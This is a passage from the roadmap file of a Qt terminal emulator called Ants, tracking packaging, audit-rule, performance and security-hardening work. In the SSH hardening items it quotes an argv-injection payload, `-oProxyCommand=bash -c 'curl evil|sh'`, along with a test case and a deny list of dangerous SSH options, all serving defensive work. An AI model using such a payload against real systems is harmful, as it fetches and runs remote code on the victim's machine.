  across the inline-display vector + the Kitty cache; cap is **256 MB
  per terminal**. Sixel rejects up front from declared raster size;
  Kitty PNG / iTerm2 OSC 1337 reject post-decode. Inline red error
  text surfaces the rejection (no desktop notification). Per-image
  dimension cap (`MAX_IMAGE_DIM = 4096`) was already in place and
  remains stricter than the 16384 the original ROADMAP item called
  for. See
  [CHANGELOG.md §0.6.11](CHANGELOG.md#0611--2026-04-14).

### 📦 Distribution readiness (H1–H4)

Near-term packaging-polish work — all fully additive, zero C++ code
changes, no new runtime dependencies. Together these four bundles
take Ants from "side project on GitHub" to "package a distro
maintainer could pick up tomorrow." See the
[distribution-adoption overview](#distribution-adoption-overview)
for the full multi-release plan.

- ✅ **H1 — `SECURITY.md` + `CODE_OF_CONDUCT.md`**. Shipped in 0.6.16.
  Coordinated-disclosure policy with supported-versions table,
  reporting channel (GitHub Security Advisory + encrypted email),
  disclosure timeline, severity rubric, in/out of scope lists, and an
  acknowledgement of the hardening we already do. Contributor Covenant
  2.1 verbatim with a dedicated maintainer email + the private GitHub
  Security Advisory listed as conduct reporting channels. Clears the
  Debian / Fedora / Ubuntu security-team review gate. See
  [CHANGELOG.md §0.6.16](CHANGELOG.md#0616--2026-04-14).
- ✅ **H2 — AppStream metainfo + polished desktop entry**. Shipped in
  0.6.17. `packaging/linux/org.ants.Terminal.metainfo.xml` (AppStream
  1.0 with summary / description / releases / categories / keywords /
  OARS content rating / supports / provides / launchable) and
  `packaging/linux/org.ants.Terminal.desktop` (reverse-DNS id,
  tightened Keywords, StartupWMClass, two Desktop Actions for
  NewWindow + QuakeMode). CMake install rules via `GNUInstallDirs`
  cover desktop / metainfo / six hicolor icons, and CI runs
  `appstreamcli validate --explain` + `desktop-file-validate` on every
  push. `MimeType=` entries deliberately omitted — Ants doesn't
  register any URL-scheme handlers, so claiming them would be false
  metadata. Follow-up: add real UI screenshots under
  `docs/screenshots/` and a `<screenshots>` block in the metainfo so
  GNOME Software tiles render a preview instead of the app icon. See
  [CHANGELOG.md §0.6.17](CHANGELOG.md#0617--2026-04-14).
- ✅ **H3 — Man page**. Shipped in 0.6.18.
  `packaging/linux/ants-terminal.1` in `groff -man` covering synopsis,
  description, every CLI flag (`-h`/`--help`, `-v`/`--version`,
  `--quake`/`--dropdown`, `--new-plugin <name>` with the full
  validation contract), environment variables (`SHELL`, `HOME`,
  `XDG_CONFIG_HOME`, `XDG_DATA_HOME`, `ANTS_PLUGIN_DEV`,
  `QT_QPA_PLATFORM`), files
  (`~/.config/ants-terminal/{config.json,themes,plugins}`,
  `~/.local/share/ants-terminal/{sessions,recordings,logs}`,
  `<project>/{audit_rules.json,.audit_suppress}`), exit status (the
  four `--new-plugin` codes), bugs (GitHub issues link, SECURITY.md
  for embargoed reports), authors, and see-also (xterm, konsole,
  gnome-terminal, tmux, ssh, forkpty(3), appstreamcli,
  desktop-file-validate). CMake install rule to
  `${CMAKE_INSTALL_MANDIR}/man1/`. CI lints the source with
  `groff -man -Tutf8 -wall …` so syntax regressions fail the build
  the same way `appstreamcli` / `desktop-file-validate` do for H2.
  See [CHANGELOG.md §0.6.18](CHANGELOG.md#0618--2026-04-15).
- ✅ **H4 — Shell completions (bash / zsh / fish)**. Shipped in
  0.6.19. `packaging/completions/ants-terminal.bash` registers an
  `_ants_terminal` function via `complete -F`;
  `packaging/completions/_ants-terminal` is a `#compdef` script using
  `_arguments` with proper exclusion groups (`--quake` ⇄ `--dropdown`,
  `-h` / `-v` short-circuit); `packaging/completions/ants-terminal.fish`
  uses one `complete -c` declaration per flag with manpage-aligned
  descriptions. CMake installs each to the conventional vendor
  location (`${datarootdir}/bash-completion/completions/ants-terminal`,
  `${datarootdir}/zsh/site-functions/_ants-terminal`,
  `${datarootdir}/fish/vendor_completions.d/ants-terminal.fish`); all
  three are auto-discovered on system-wide installs. CI lints each
  file with the matching shell's `-n` / `--no-execute` flag so syntax
  regressions fail the build. Closes the H1–H4 distribution slice;
  remaining packaging work (H5 distro recipes, H6 Flatpak, H7 docs
  site) lives in 0.8.0+. See [CHANGELOG.md §0.6.19](CHANGELOG.md#0619--2026-04-15).

### 🧰 Dev experience — Project Audit tool

Surfaced by the 0.6.5 audit pass (see [CHANGELOG.md §0.6.5](CHANGELOG.md#065--2026-04-14)).
Each item is a rule / self-check the in-app `AuditDialog` should grow so
findings like the ones we caught manually would be caught automatically on
the next run.

- ✅ **Qt rule: unbounded callback payloads.** Shipped in 0.6.8 as
  `unbounded_callback_payloads` — same-line regex flags
  `QString::fromUtf8(<expr>.c_str()…)` forwarded to a `*Callback(…)`
  without a `.left()` / `.truncate()` / `.mid()` / `.chopped()` /
  `.chop()` cap. See [CHANGELOG.md §0.6.8](CHANGELOG.md#068--2026-04-14).
- ✅ **Qt rule: `QNetworkReply` connects without context.** Shipped in
  0.6.8 as `qnetworkreply_no_abort` — flags 3-arg `connect()` to
  QNetworkReply signals whose third argument is a bare lambda (no
  context object means no auto-disconnect on owner destruction → UAF
  if reply fires after `this` is gone). The 4-arg form is enforced.
  See [CHANGELOG.md §0.6.8](CHANGELOG.md#068--2026-04-14).
- ✅ **Observability rule: silent `catch (...)`.** Shipped in 0.6.7 as
  `silent_catch` — flags empty same-line `catch(...) {}` handlers.
  Extending to multi-line / single-statement trivial bodies remains future
  work (`grep -Pzo` plumbing). See [CHANGELOG.md §0.6.7](CHANGELOG.md#067--2026-04-14).
- ✅ **Self-consistency: fixture-per-`addGrepCheck`.** Shipped in 0.6.6 —
  `audit_fixture_coverage` rule in the dialog + CI-enforced cross-check in
  `tests/audit_self_test.sh`. See [CHANGELOG.md §0.6.6](CHANGELOG.md#066--2026-04-14).
- ✅ **Build-flag recommender.** Shipped in 0.6.7 as `missing_build_flags`
  — scans the top-level `CMakeLists.txt` for `-Wformat=2`, `-Wshadow`,
  `-Wnull-dereference`, `-Wconversion`. See
  [CHANGELOG.md §0.6.7](CHANGELOG.md#067--2026-04-14).
- ✅ **No-CI check.** Shipped in 0.6.7 as `no_ci` — covers `.github/workflows/`,
  `.gitlab-ci.yml`, `.circleci/`, `.travis.yml`, and `Jenkinsfile`. See
  [CHANGELOG.md §0.6.7](CHANGELOG.md#067--2026-04-14).
- ✅ **Sanitizer-in-ctest hookup.** Shipped in 0.6.7 — dedicated `build-asan`
  job in `.github/workflows/ci.yml` runs ctest + a binary smoke test under
  ASan/UBSan with `QT_QPA_PLATFORM=offscreen` on every push. See
  [CHANGELOG.md §0.6.7](CHANGELOG.md#067--2026-04-14).
- ✅ **`CONTRIBUTING.md`.** Shipped in 0.6.7 — derived from `STANDARDS.md`,
  covers build modes, test layout, adding an audit rule, version-bump
  checklist. See [CHANGELOG.md §0.6.7](CHANGELOG.md#067--2026-04-14).
- ✅ **Upgrade `actions/checkout` to v5 (Node.js 24).** Shipped in
  0.7.0. Both `.github/workflows/ci.yml` pin sites bumped to
  `actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd  # v5.0.1`
  (v5.0.0 and v5.0.1 both resolve to the same SHA; v5.0.1 is the
  currently-latest patch). Landed in commit `aad4f32`. Input surface
  is stable across v4→v5 — no workflow changes required. See
  [CHANGELOG.md §0.7.0](CHANGELOG.md#070--2026-04-19).

---

## 0.7.7 — hardening pass (target: 2026-05)

**Theme:** four-dimensional review (perf / security / bugs / refactor)
commissioned 2026-04-22 across the full codebase. Findings triaged into
three cohorts — **(A) shipped in-tree in this release** (the small,
verified, low-blast-radius fixes that went in before this ROADMAP update
so 0.7.7 has real content), **(B) 0.7.7 planned work** (medium-scope,
self-contained), and **(C) deferred to 0.8+** (large refactors and
architecture-level perf work that deserves its own release arc). Each
item carries the dimension tag (⚡ perf, 🔒 security, 🐛 bug,
🧹 refactor) so the release notes can group them.

### 🐛 / 🔒 — Shipped alongside this ROADMAP revision

- ✅ **🐛 `insertLines` / `deleteLines` now sync `m_screenHyperlinks`.**
  Was: CSI L / CSI M shifted `m_screenLines` rows without moving the
  parallel OSC 8 hyperlink table, so clickable spans drifted away from
  the cells containing the link text after any `vim :delete` /
  `:insert` burst. Now: the same erase/insert pattern runs against
  `m_screenHyperlinks`, gated on `bottom < m_screenHyperlinks.size()`
  so under-populated tables (lazy-grow path at
  `TerminalGrid::addRowHyperlink`) don't throw.
  Fix in `src/terminalgrid.cpp` (insertLines/deleteLines bodies).
- ✅ **🐛 Resize clamps `m_hyperlinkStartRow` / `m_hyperlinkStartCol`.**
  Was: shrinking the grid below the row where an OSC 8 was opened left
  the start coordinates pointing at a no-longer-existent row — a later
  grow-back would attach the span to a row whose content no longer
  matched. Now: both fields are `std::clamp`'d on every resize, same
  as `m_cursorRow/Col`.
- ✅ **🔒 SSH bookmark argv-injection hardening (CVE-2017-1000117
  class).** `SshBookmark::toSshCommand` now inserts `--` before the
  host argument, stopping OpenSSH from parsing a host whose value
  begins with `-` as an option (classic
  `-oProxyCommand=bash -c 'curl evil|sh'` trick). Shell-quoting alone
  does not defend against this — the shell passes the value correctly
  but `ssh` itself then re-interprets the leading dash.
- ✅ **🔒 Image-bomb defence: PNG dimension peek before decode.** Both
  decode sites (OSC 1337 iTerm2 and Kitty graphics PNG path) now use
  `QImageReader::size()` to read the PNG header and reject images
  declaring dimensions over `MAX_IMAGE_DIM` (4096) *before* calling
  `QImage::loadFromData`. Prevents a 1 KB compressed PNG declaring
  100 000 × 100 000 from forcing a multi-GB decompression allocation
  in the millisecond window before the post-decode dimension guard
  fires. Follows the
  [Qt6 untrusted-data guidance](https://doc.qt.io/qt-6/untrusteddata.html).
- ✅ **🔒 OSC/DCS/APC buffer memory release after dispatch.** Was: an
  attacker who streamed a ~10 MB inline image left three 10 MB
  `std::string` buffers sitting at full capacity in the VtParser for
  the lifetime of the process (30 MB permanent overhead per terminal),
  because `.clear()` doesn't shrink. Now: dispatch does
  `std::move` into the `VtAction`, then a `releaseIfLarge` helper
  swap-deallocates when capacity exceeds 64 KB. Normal-traffic buffers
  stay cheap; adversarial ones don't linger.

### 🐛 / ⚡ / 🧹 — Shipped in the 0.7.7 planned-work pass

- ✅ **🐛 Audit-pipeline regression coverage for the 0.7.7 hardening fixes.**
  Four new `tests/features/` subtrees lock the 0.7.6 → 0.7.7 fixes with
  the same "fails on pre-fix code" guarantee the rest of the feature
  suite carries:
  - `osc8_insert_delete_lines/` — feeds OSC 8 at row 5, issues CSI 2 L
    from cursor row 2, asserts the span now lives at row 7. Pre-fix,
    the span stayed on row 5 because `m_screenHyperlinks` was never
    shifted.
  - `hyperlink_resize_clamp/` — opens an OSC 8 at (20, 50), shrinks to
    (5, 10), closes with OSC 8 close, asserts the span lands on a row
    in `[0, 4]`. Pre-fix, the close site's upper-bound guard silently
    dropped the span because `m_hyperlinkStartRow` still held 20.
  - `ssh_dash_host_rejected/` — constructs `SshBookmark` in five
    scenarios (plain, user@host, identity+port, extraArgs, malicious
    `-oProxyCommand=evil`) and asserts every command contains ` -- `
    before the host token. Catches any future refactor that drops the
    argv terminator.
  - `image_bomb_png_header_peek/` — static source inspection of
    `src/terminalgrid.cpp`: every `loadFromData(...)` call must be
    preceded by a `QImageReader` peek in the 10 lines above or carry a
    `// image-peek-ok` marker. Runtime fuzz would either succeed
    (no signal) or hang CI (no signal either).
- ✅ **⚡ `isCellSearchMatch` — linear scan → `std::lower_bound`.**
  `m_searchMatches` is sorted by `globalLine`; the binary search jumps
  to the first match ≥ current line, then iterates only matches whose
  `globalLine` equals it. The previous impl self-described as "binary
  search" but walked the whole vector from index 0. Expected win: 5–20%
  of paint time on search-highlighted content.
- ✅ **⚡ `QFontMetrics` hoisted out of the per-cell underline loop.**
  `updateFontMetrics()` now caches `underlinePos` + `lineWidth` into
  `m_fontUnderlinePos` / `m_fontLineWidth` members; the underline
  drawing path reads the members directly. Relevant on TUI apps that
  underline every cell (Claude Code's SGR 4 pattern).
- ✅ **⚡ Selection-bounds normalisation lifted out of `isCellSelected`.**
  `paintEvent` now normalises the selection once per frame into local
  `selLineStart` / `selColStart` / `selLineEnd` / `selColEnd` /
  `selRectColMin` / `selRectColMax`, and uses an inline `cellInSelection`
  lambda that consumes the pre-normalised values. The `isCellSelected`
  method is kept for the other callers (`selectedText` etc.) but the
  hot-path caller no longer re-runs `std::swap` + `std::min`/`std::max`
  for every cell in the frame.
- ✅ **🧹 `setOwnerOnlyPerms` helper (`src/secureio.h`).** The bitmask
  `QFileDevice::ReadOwner | QFileDevice::WriteOwner` was previously
  repeated at 11 call sites across `config.cpp`, `sessionmanager.cpp`
  (×2), `claudeallowlist.cpp`, `auditdialog.cpp` (×4),
  `claudeintegration.cpp` (×2), `remotecontrol.cpp`, and
  `auditrulequality.cpp`. One typo (`ReadOther`, `ReadGroup`) away
  from widening access to a file that may hold an API key. Two-overload
  helper: `setOwnerOnlyPerms(QFileDevice&)` for open handles (QFile /
  QSaveFile) and `setOwnerOnlyPerms(const QString&)` for existing
  paths (socket perms, post-close repairs). Every call site is now
  routed through one of the two. The one surviving 0755 case in
  `settingsdialog.cpp` (hooks shell script — needs executable bit for
  every user role) stays literal by design.
- ✅ **🧹 Shared `shellQuote` helper (`src/shellutils.h`).** Previously
  a static function in `sshdialog.cpp` and *re-defined as a local
  lambda* in `mainwindow.cpp::openClaudeProjectsDialog` — two implem-
  entations of regex-based single-quote-escaping, one that handled
  empty strings / pass-throughs and one that didn't. Consolidated into
  one inline header; both call sites rewritten to use it.

### 💭 0.8+ deferred — larger scope

- ⚖️ **⚡ `scrollUp` / `scrollDown` — erase/insert loop → `std::rotate`
  (investigated 0.7.9, not shipped).** Hot path during every newline
  in a full-window scroll. The theoretical win was "one O(rows) rotate
  instead of a count-length O(rows) loop," but the newline-stream case
  is always `count == 1`, which reduces the old `erase(begin) +
  insert(end)` to one shift + push_back — practically identical to
  `std::rotate(first, first+1, last)`'s save/shift/restore cycle, with
  rotate's save-and-restore costing ~2 extra moves per call. Measured
  on `bench_vt_throughput newline_stream` the rotate path was 12–15%
  **slower** (5.2 → 4.6 MB/s) because rotate paid for the save/restore
  while the blank-overwrite still had to allocate the bottom row.
  The real bottleneck is the per-scroll `makeRow(m_cols, ...)` +
  `vector<Cell>` allocation, plus the heap handoff to scrollback —
  not the container shuffle. A future perf pass should replace the
  scrollback push with a cell-vector swap (keeping the capacity in
  the screen row, transferring only the populated-cell snapshot to
  scrollback) or move to a ring-buffered screen grid. The 0.7.9
  investigation did ship the guard: `tests/features/scroll_region_rotate`
  pins the observable semantics so the next attempt can refactor
  safely.
- ✅ **⚡ Cell-buffer free-list for scroll paths (shipped 0.7.10).**
  Small `m_freeCellBuffers` pool (cap 4 entries) + `takeBlankedCellsRow()`
  / `returnCellsRow()` helpers. `scrollUp`, `scrollDown`, `insertLines`,
  `deleteLines` recycle cell buffers instead of calling `makeRow(m_cols, …)`
  on every scroll. When `m_scrollback` hits capacity and evicts a line,
  its cells vector is salvaged into the pool; the next scroll's new
  bottom row pulls from it, skipping the allocator. Measured
  **+15.8 %** on `bench_vt_throughput newline_stream` (5.26 → 6.09
  MB/s, median of ten-run pairs). Other corpora flat to mildly
  improved; `utf8_cjk` also gained +12 %. First perf result to
  validate the 0.7.9 thesis that the container shuffle was a red
  herring and the allocator was the actual hot spot.
- ✅ **⚡ Per-frame `QString` construction in the text-run accumulator
  (shipped 0.7.9).** `QString::fromUcs4()` used to be called per
  non-space cell in both `TerminalWidget::paintEvent` and
  `GlRenderer::render`; the run was then built via repeated
  `QString::operator+=`. Reworked to accumulate codepoints into a
  reusable `std::vector<char32_t>` on the `Run` struct and call
  `QString::fromUcs4(data, size)` exactly once at run-push time. The
  vector is reused across runs within a frame (cleared on push), so
  steady-state allocation is amortised.
- ✅ **⚡ Combining-char map in-place key remap on `deleteChars` /
  `insertBlanks` (shipped 0.7.11).** Old impl built a new
  `unordered_map` then move-assigned it, re-hashing every surviving
  entry and reallocating buckets. Rewrote to use node-handle
  `extract()` + key-mutate + `insert()`: the map's nodes are detached,
  their integer key field is set to the shifted column, and the nodes
  are reinserted — no bucket reallocation, no re-hashing of the value
  vector. Empty-map fast-path short-circuits the whole block.
  deleteChars sorts shifted keys ascending (leftward shift can't
  collide in ascending order); insertBlanks sorts descending (rightward
  shift can't collide in descending order).
- ⚖️ **🧹 Dialog base class (investigated 0.7.9, rejected).** Only
  `settingsdialog.cpp` and `claudeallowlist.cpp` actually use
  `QDialogButtonBox` with Ok/Apply/Cancel; the other four dialogs
  (`aidialog`, `sshdialog`, `claudeprojects`, `auditdialog`) have
  bespoke button layouts without the triplet pattern. Extracting a
  `DialogBase` with `setupStandardButtons` would save ~10 lines across
  2 call sites — premature abstraction with real regression surface
  (each call site has subtle per-dialog validation / error-hint
  wiring). Deferred unless/until a third dialog needs the pattern.
- ⚖️ **🧹 `ManagedProcess` (investigated 0.7.9, rejected).**
  `auditdialog.cpp` uses a single shared `QProcess` member that runs
  checks serially, not "six copies." The timeout-and-cleanup dance is
  already at one call site. Other files that launch processes
  (`claudeintegration.cpp` for `claude` binary, `ssh` via `Pty`) have
  one-off patterns with no shared structure to extract. Re-file if a
  second generalised process-runner emerges.
- ✅ **🔒 IPC-socket `/tmp` fallback stat-guard (shipped 0.7.11).**
  `remotecontrol.cpp` still defaults to `XDG_RUNTIME_DIR` (correct,
  0700 perms) but now gates every `QLocalServer::removeServer(path)`
  call behind a `lstat()` check. Uses `lstat` (not `stat`) so a
  symlink reports as a symlink and is refused. Requires `S_ISSOCK(mode)`
  AND `st_uid == getuid()`; `ENOENT` passes through (nothing to remove).
  On refusal the remote-control layer disables itself with a clear
  log message instead of unlinking an unknown file.

### ✅ Shipped in 0.7.8 — Fold-in to the project audit tool

Every finding that is expressible as a repo-wide grep / AST pattern
becomes a persistent audit rule — that's how a review turns into a
regression guard instead of a one-off sweep. The 0.7.8 release adds
three new rules so the 0.7.6 / 0.7.7 hardening sweep leaves behind
automation, not just diffs. All three fire cleanly on the current
tree: the shipped fix sites are suppressed by the intended runtime
filter (`<< "--"` guard, `image-peek-ok` tag, `disable-file` on the
helper itself):

- ✅ `ssh_argv_dash_host` (Security, Major) — matches
  `<< shellQuote(...host...)` and drops findings when `<< "--"`
  appears within ±5 lines. Context window is 5 (not 3 as originally
  specced) to span the `if (!user.isEmpty()) / else` split in
  `sshdialog.cpp:67-71`.
- ✅ `qimage_load_without_peek` (Qt, Minor) — matches
  `.loadFromData(` and drops findings tagged `// image-peek-ok` or
  preceded by `QImageReader` within ±5 lines. Two shipped sites in
  `terminalgrid.cpp` carry the reviewer sign-off tag.
- ✅ `setPermissions_pair_no_helper` (Qt, Info) — matches
  `setPermissions(... QFileDevice::ReadOwner | WriteOwner)` and
  nudges toward `setOwnerOnlyPerms()` from `src/secureio.h`. Pattern
  excludes the 0755 hook-script case (extra `|` flags). The helper
  itself is suppressed via `// ants-audit: disable-file`.

See the [feature-coverage audit lane](CHANGELOG.md#076--2026-04-22)
work in 0.7.6 for the precedent of "each review leaves a detector
behind."

### 📚 Prior-art references consulted for this release

- [ANSI Terminal security in 2023 and finding 10 CVEs](https://dgl.cx/2023/09/ansi-terminal-security) — CVE-2022-41322 (Kitty OSC desktop notification), ConEmu CVE-2022-46387 / CVE-2023-39150, iTerm2 CVE-2022-45872 (DECRQSS mishandling); the OSC/DCS/APC buffer-release work above is in the same class.
- [Qt6 Handling Untrusted Data](https://doc.qt.io/qt-6/untrusteddata.html) — Qt's own warning that `QDataStream` demarshalling operators allocate based on stream-declared sizes with no sanity check; motivates the `QImageReader` size-peek pattern used here and is the reference for a future pass on `SessionManager` deserialisation.
- [CVE-2017-1000117](https://nvd.nist.gov/vuln/detail/CVE-2017-1000117) — git-ssh argv injection via dash-prefixed host; the ssh-bookmark `--` fix above is a direct port of the mitigation.

---

## 0.7.12 — independent-review sweep (target: 2026-05)

**Theme:** fold-in of the 2026-04-23 multi-agent code review. Fourteen
independent `general-purpose` subagents were dispatched in parallel — one
per subsystem — each briefed only with source paths + contract docs
(`CLAUDE.md`, `PLUGINS.md`, `tests/features/*/spec.md`) and external
standards (ECMA-48, xterm ctlseqs, POSIX `forkpty(3)`, SARIF v2.1.0,
OpenAI API, SSE, Lua 5.4 Reference Manual, OWASP LLM Top 10,
CVE-2017-1000117, OpenGL 3.3). Agents had **zero context on
implementation reasoning** — they reviewed code against contracts, not
against intent. This is the "escape the self-graded-homework bubble"
lane: findings here come from outside the author's head.

The sweep produced ~60 HIGH findings, ~80 Medium, and ~40 Low. This
section tracks the HIGH findings plus cross-cutting themes that were
flagged by multiple independent reviewers. Medium/Low findings are
captured in the review transcripts (commit `<tbd>`) and triaged into
grep rules or individual tickets as they become actionable.

### 📦 Outstanding-item bundle plan (post-0.7.27)

Bump overhead is fixed (CHANGELOG, metainfo XML, debian changelog,
drift check, build, test, commit, tag) — paid once whether the
release contains one fix or four. The remaining 📋 items below are
grouped by **theme + file affinity** so each future bump retires
2-4 related items at once instead of one. Each item still gets its
own `tests/features/<name>/` spec + regression test; the bundle
gets one CHANGELOG section and one drift cycle.

| Bundle | Theme | Items | File affinity |
|--------|-------|-------|---------------|
| **0.7.28** ✅ | Audit pipeline I — process-side robustness | per-tool timeout override · incremental QProcess output drain · distinguish segfault from "no findings" | `auditdialog.cpp` |
| **0.7.29** ✅ | Audit pipeline II — output quality | SARIF `suppressions[]` array emission · regex-DoS watchdog on user `drop_if_matches` · widen `computeDedup` to 96 bits | `auditdialog.cpp` |
| **0.7.30** ✅ | Session-file integrity | SHA-256 payload checksum · pre-validate compressed length prefix before `qUncompress` · `QDataStream::status()` checks inside cell loop | `sessionmanager.cpp` |
| **0.7.31** ✅ | Persistence integrity (cross-file) | silent-data-loss on parse failure (settings-dialog mirror) · `setOwnerOnlyPerms` ordering bugs · concurrent-writer guard on `config.json` + `settings.local.json` · `secureio.h` split | `config.cpp`, `sessionmanager.cpp`, `claudeallowlist.cpp`, `debuglog.cpp`, `settingsdialog.cpp`, `secureio.h` |
| **0.7.32** ✅ | UX bundle (Settings + Review Changes + Tab UX) | dependency-UI enable gating · Cancel rollback for Profiles tab · Restore Defaults per-tab · Review Changes branch awareness · Review Changes live updates (QFileSystemWatcher + Refresh) · always-visible tab × glyph (user feedback) | `settingsdialog.cpp`, `mainwindow.cpp` |
| **0.7.33** ✅ | Lifecycle / cleanup | PTY dtor off-main-thread (last PTY Tier 2 item) · Portal session close · Lua manifest size cap + canonical plugin path | `ptyhandler.cpp`, `globalshortcutsportal.cpp`, `pluginmanager.cpp` |
| **0.7.34** ✅ | Terminal correctness | origin-mode translate on CUP/HVP/VPA · DECSTBM origin-aware home · DECSC saves DECOM + DECAWM (real tmux/screen breakage) | `terminalgrid.cpp` |

**Standalone items (don't bundle):**
- `VtBatch` zero-copy across thread hop (`vtstream.h`) — perf; pair
  with the 0.8.x perf work in § 0.8.0 ⚡ Performance instead.
- ✅ Renderer subsystem decision — resolved 0.7.44 (deleted
  `glrenderer.cpp`; QPainter+QTextLayout is the sole render path).
  See entry below.

**0.8.x external-signal CI lanes (separate phase):**
- vttest as CI lane · differential screen-dump harness vs xterm/kitty
  · libFuzzer target against `VtParser` · real-TUI smoke lane.
  These are CI-infrastructure work, not in-tree fixes; track as a
  cluster under § 0.8.x dev experience.

The Settings dialog Tier 3 items (dependency-UI gating, Cancel
rollback, Restore Defaults) are mirrored at L1544-1551 below; that
list stays as the canonical location and 0.7.32 pulls from it. The
bundle table above is an index, not a duplication.

Picking the **next** bundle is mechanical: take the lowest-numbered
release whose items are all still 📋 in the source-of-truth list
below. If a referenced item turns ✅ between bumps, the bundle
shrinks; if a new item appears mid-stream that fits an existing
bundle's theme, fold it in rather than spinning up a new release.

### 🔥 Cross-cutting themes (patterns caught by ≥2 reviewers)

- ✅ **Silent-data-loss on parse failure.** Shipped 0.7.12 in
  `config.cpp` + `claudeallowlist.cpp` + `settingsdialog.cpp`
  (refuse-to-save + `rotateCorruptFileAside` shared helper).
  Behavioural test coverage extended to the allowlist + settings-
  dialog mirror sites in 0.7.31 via
  `tests/features/settings_parse_failure_mirror/`. Cross-cutting
  pattern fully retired.
- ✅ **`/tmp/*.js` TOCTOU via predictable filenames.** Shipped 0.7.12
  (Tier 1 batch). All three KWin script paths
  (`xcbpositiontracker.cpp`, `mainwindow.cpp` twice) migrated from
  predictable `/tmp/kwin_*.js` filenames to `QTemporaryFile` with
  `setAutoRemove(false)`; the async dbus-send chain removes the file
  after use. Closes the same-UID symlink-swap TOCTOU + same-name
  collision between Ants instances. Orphan-cleanup sweep added 0.7.15
  (`MainWindow` ctor runs `sweepKwinScriptOrphansOnce()` for stale
  files older than 1 hour, guarded by a `static bool` so a second
  MainWindow doesn't re-sweep).
- ✅ **`setOwnerOnlyPerms` ordering bugs.** Shipped 0.7.31. Every
  persistence site that did fd-only chmod now also re-chmods the
  final inode after rename / commit succeeds — `Config::save`,
  `SessionManager::saveSession`, `SessionManager::saveTabOrder`,
  `SettingsDialog::installClaudeHooks`,
  `SettingsDialog::installClaudeGitContextHook`. The rename-fallback
  path on FAT/exFAT/SMB/NFS/copy-unlink filesystems would otherwise
  leak ai_api_key (config.json), bearer tokens (settings.json), or
  paste-buffer scrollback (session_*.dat) at 0644. `debuglog.cpp`
  was already covered in 0.7.20. `claudeallowlist.cpp` was already
  covered in 0.7.17. Locked by
  `tests/features/persistence_post_rename_chmod/` — 10 invariants
  spanning the three remaining persistence files.
- ✅ **"Documented feature, dead code" drift** — 5 distinct cases caught
  by 4 different reviewers, now all resolved:
  - `gpu_rendering` / partial-update spec: spec.md rewritten in
    [Unreleased] to match the live QWidget-base test; directory name
    kept for CMake stability. `gpu_rendering` config key retained
    because `glrenderer` is reachable via the optional container path
    (ROADMAP Tier 3 revive-or-delete decision is separate tracking).
  - `background_alpha` config key + getter/setter + member **removed**
    in [Unreleased] — redundant with `opacity`, which is what the user
    actually sets. Paint path at `terminalwidget.cpp:605` remains
    unchanged (uses `m_windowOpacity`, driven by `opacity` config).
  - Claude plan-mode `value("mode")` → `permissionMode` fix shipped
    in 0.7.12.
  - `session_persistence` default doc drift corrected in README
    ([Unreleased]); code default was right.
  - `font_size` range doc drift corrected in README ([Unreleased]);
    code range (4–48) was right.
- ✅ **No-auth local IPC is a UID-scope RCE chain.** Shipped 0.7.12
  (Tier 1 batch). `remote_control_enabled` config key added (default
  `false`, matching Kitty's `allow_remote_control=no`); MainWindow
  gates the listener's `start()` on this key. `send-text` request
  payloads pass through `RemoteControl::filterControlChars` which
  strips `{0x00..0x08, 0x0B..0x1F, 0x7F}` while preserving HT/LF/CR
  and all UTF-8 bytes >= 0x80. Callers needing raw byte pass-through
  set `"raw": true` in the request JSON. Closes the UID-scope
  keystroke-injection RCE chain. Hardened further 0.7.12 by caching
  the gate decision at process start (`mainwindow.cpp:799`
  `static const bool remoteControlGate = …`) so a second MainWindow
  doesn't re-read the flag. Locked by
  `tests/features/remote_control_opt_in/` (config round-trip
  assertion + structural check that `start()` lives inside a
  conditional). X25519 auth work for opt-in users tracked separately.

### 🔒 Tier 1 — ship-this-week fixes (security/data-loss blockers)

- ✅ **`permissionMode` field-name typo.** `claudeintegration.cpp:495`
  read `value("mode")`; real Claude Code JSONL (verified against live
  `~/.claude/projects/*.jsonl` at v2.1.87) uses `permissionMode`.
  Fixed; `planModeChanged(true)` now actually fires on plan-mode entry.
  Regression test anchored to real JSONL schema:
  `tests/features/claude_plan_mode_detection/`.
- ✅ **Remote-control opt-in default + `send-text` control-char filter.**
  Added `remote_control_enabled` config key (default `false`, matches
  Kitty `allow_remote_control=no`). The MainWindow now gates the
  listener's `start()` on this key. `send-text` request payloads pass
  through `RemoteControl::filterControlChars` which strips
  `{0x00..0x08, 0x0B..0x1F, 0x7F}` while preserving HT/LF/CR and all
  UTF-8 bytes >= 0x80. Callers needing raw byte pass-through set
  `"raw": true` in the request JSON. Closes the UID-scope keystroke-
  injection RCE chain. Regression test:
  `tests/features/remote_control_opt_in/`.
- ✅ **Parse-failure-overwrites-data — Config + Allowlist + shared
  helper.** `Config::load()` now distinguishes fresh-run / valid /
  corrupt. On corrupt, the on-disk file is rotated to
  `config.json.corrupt-<ms_timestamp>[-N]` via the new shared
  `rotateCorruptFileAside()` helper (secureio.h) with a
  collision-retry loop up to 10 attempts (addresses the /indie-review
  same-second-collision HIGH finding). `m_loadFailed` is latched;
  `save()` is a no-op for the session so setters can't destroy the
  user's hand-fixable bytes. Separate log messages for success vs
  failed backup.
  `ClaudeAllowlistDialog::saveSettings()` adopts the same pattern:
  parse failure refuses to save rather than destroying the non-
  permissions keys (model, editor prefs, custom hooks).
  `SessionManager` verified as already-defended — its per-tab files
  use granular `QDataStream::status()` checks at every read, and
  failure returns false without clobbering the file.
  Regression test: `tests/features/config_parse_failure_guard/`
  (behavioral: plants a corrupt file, asserts setter doesn't
  overwrite).
- ✅ **`std::rename` return checked + errno logged.** `config.cpp`
  save path: rename failure logs errno via
  `ANTS_LOG(DebugLog::Config, ...)` and removes the orphan tmp file.
  `.bak` rotation subsumed by the parse-failure backup above.
- ✅ **SSH bookmark `extraArgs` ProxyCommand/LocalCommand rejection.**
  `SshBookmark::sanitizeExtraArgs` filters `-oProxyCommand=`,
  `-oLocalCommand=`, `-oPermitLocalCommand=` in both the
  single-token and space-separated forms (case-insensitive per
  OpenSSH's own option parser). Closes the CVE-2017-1000117-adjacent
  RCE-via-bookmark-field vector. Regression test:
  `tests/features/ssh_extra_args_sanitize/` (20 assertions covering
  both forms, case variants, end-to-end `toSshCommand`).
- ✅ **`/tmp/kwin_*.js` → `QTemporaryFile`.** Three callsites
  (`xcbpositiontracker.cpp`, `mainwindow.cpp` twice) migrated from
  predictable filenames to unpredictable `QTemporaryFile` with
  `setAutoRemove(false)` (the async dbus-send chain removes the file
  after use). Closes the same-UID symlink-swap TOCTOU + same-name
